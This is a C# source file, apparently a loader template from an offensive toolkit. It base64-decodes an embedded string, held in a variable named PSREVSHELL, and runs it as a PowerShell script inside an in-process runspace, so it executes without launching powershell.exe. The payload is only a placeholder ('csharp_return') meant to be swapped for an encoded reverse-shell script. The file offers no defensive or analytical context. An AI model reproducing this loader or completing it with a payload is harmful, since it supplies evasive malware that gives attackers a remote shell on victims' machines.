using System;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Net;

namespace nopowershell
{
    class Programe
    {
        
        public static void loader()
        {

            string m = "csharp_return";
            byte[] PSREVSHELL = Convert.FromBase64String(m);
            string DECODINGSTRING = Encoding.UTF8.GetString(PSREVSHELL);
            Runspace LALALALA = RunspaceFactory.CreateRunspace();
            LALALALA.Open();
            Pipeline PIPLINE = LALALALA.CreatePipeline();
            PIPLINE.Commands.AddScript(DECODINGSTRING);
            PIPLINE.Invoke();
            LALALALA.Close();
        }
        static void Main(string[] args)
        {
          
            loader();
        }

    }

}
